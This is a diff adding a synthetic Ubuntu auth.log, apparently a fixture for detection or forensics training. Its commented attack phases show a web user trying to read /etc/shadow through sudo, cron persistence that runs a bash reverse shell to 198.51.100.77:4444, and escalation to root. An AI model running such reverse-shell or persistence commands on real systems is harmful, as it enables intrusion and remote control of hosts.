@@ -1,0 +1,59 @@
+# Ubuntu /var/log/auth.log
+# Host: k8s-worker-node-01
+# Operating System: Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
+# Timezone: UTC (+0000)
+
+# --- BASELINE NORMAL AUTHENTICATION & ADMIN ACTIVITY ---
+Sep 14 08:00:01 k8s-worker-node-01 CRON[12401]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 14 08:00:01 k8s-worker-node-01 CRON[12402]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
+Sep 14 08:00:04 k8s-worker-node-01 CRON[12401]: pam_unix(cron:session): session closed for user root
+Sep 14 08:05:01 k8s-worker-node-01 CRON[12850]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 14 08:05:01 k8s-worker-node-01 CRON[12851]: (root) CMD (/usr/lib/x86_64-linux-gnu/sysstat/debian-sa1 1 1)
+Sep 14 08:05:02 k8s-worker-node-01 CRON[12850]: pam_unix(cron:session): session closed for user root
+Sep 14 08:12:10 k8s-worker-node-01 sshd[13420]: Accepted publickey for sysadmin from 10.0.4.15 port 48210 ssh2: RSA SHA256:x9T7qM4bZ8k1L3mP0qR2sT4vU6wX8yZ0aB2cE4gH6jI
+Sep 14 08:12:10 k8s-worker-node-01 sshd[13420]: pam_unix(sshd:session): session opened for user sysadmin(uid=1000) by (uid=0)
+Sep 14 08:12:10 k8s-worker-node-01 systemd-logind[742]: New session 18 of user sysadmin.
+Sep 14 08:14:02 k8s-worker-node-01 sudo:  sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 14 08:14:02 k8s-worker-node-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by sysadmin(uid=1000)
+Sep 14 08:14:03 k8s-worker-node-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 14 08:15:01 k8s-worker-node-01 CRON[13610]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 14 08:15:01 k8s-worker-node-01 CRON[13611]: (root) CMD (/usr/lib/x86_64-linux-gnu/sysstat/debian-sa1 1 1)
+Sep 14 08:15:02 k8s-worker-node-01 CRON[13610]: pam_unix(cron:session): session closed for user root
+Sep 14 08:16:30 k8s-worker-node-01 sudo:  sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/usr/bin/cat /var/log/nginx/access.log
+Sep 14 08:16:30 k8s-worker-node-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by sysadmin(uid=1000)
+Sep 14 08:16:31 k8s-worker-node-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 14 08:18:45 k8s-worker-node-01 sshd[13420]: Received disconnect from 10.0.4.15 port 48210:11: disconnected by user
+Sep 14 08:18:45 k8s-worker-node-01 sshd[13420]: pam_unix(sshd:session): session closed for user sysadmin
+Sep 14 08:18:45 k8s-worker-node-01 systemd-logind[742]: Session 18 of user sysadmin logged out. Waiting for processes to exit.
+Sep 14 08:18:45 k8s-worker-node-01 systemd-logind[742]: Removed session 18.
+
+# --- ATTACK PHASE 1: COMPROMISED WEB APPLICATION & UNAUTHORIZED SUDO PROBE ---
+# Attacker gained initial RCE inside web container as www-data (uid=33)
+# Attempted unauthorized privilege escalation via sudo cat /etc/shadow
+Sep 14 08:34:22 k8s-worker-node-01 sudo:   www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Sep 14 08:34:25 k8s-worker-node-01 sudo: pam_unix(sudo:auth): conversation failed
+Sep 14 08:34:25 k8s-worker-node-01 sudo: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Sep 14 08:35:10 k8s-worker-node-01 sudo:   www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id
+
+# --- ATTACK PHASE 2: CRON PERSISTENCE INJECTION & REVERSE SHELL EXECUTION ---
+# Attacker established persistent backdoor via crontab injection
+Sep 14 08:38:10 k8s-worker-node-01 crontab[16201]: (www-data) BEGIN EDIT (www-data)
+Sep 14 08:38:45 k8s-worker-node-01 crontab[16201]: (www-data) REPLACE (www-data)
+Sep 14 08:38:45 k8s-worker-node-01 crontab[16201]: (www-data) END EDIT (www-data)
+# Cron daemon triggers attacker's reverse shell payload
+Sep 14 08:39:01 k8s-worker-node-01 CRON[16240]: pam_unix(cron:session): session opened for user www-data(uid=33) by (uid=0)
+Sep 14 08:39:01 k8s-worker-node-01 CRON[16241]: (www-data) CMD (/bin/bash -c "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1")
+Sep 14 08:39:02 k8s-worker-node-01 CRON[16240]: pam_unix(cron:session): session closed for user www-data
+
+# --- ATTACK PHASE 3: HIJACKED DEPLOY ACCOUNT ELEVATION & ROOT EXECUTION ---
+# Attacker pivots to compromised deploy service account (uid=1001)
+Sep 14 08:41:50 k8s-worker-node-01 sshd[17105]: Accepted password for deploy from 127.0.0.1 port 52310 ssh2
+Sep 14 08:41:50 k8s-worker-node-01 sshd[17105]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Sep 14 08:41:50 k8s-worker-node-01 systemd-logind[742]: New session 21 of user deploy.
+Sep 14 08:42:05 k8s-worker-node-01 sudo:     deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Sep 14 08:42:05 k8s-worker-node-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+
+# --- BASELINE NOISE (BENIGN CRON INTERLEAVED) ---
+Sep 14 08:45:01 k8s-worker-node-01 CRON[18120]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 14 08:45:01 k8s-worker-node-01 CRON[18121]: (root) CMD (/usr/lib/x86_64-linux-gnu/sysstat/debian-sa1 1 1)
+Sep 14 08:45:02 k8s-worker-node-01 CRON[18120]: pam_unix(cron:session): session closed for user root
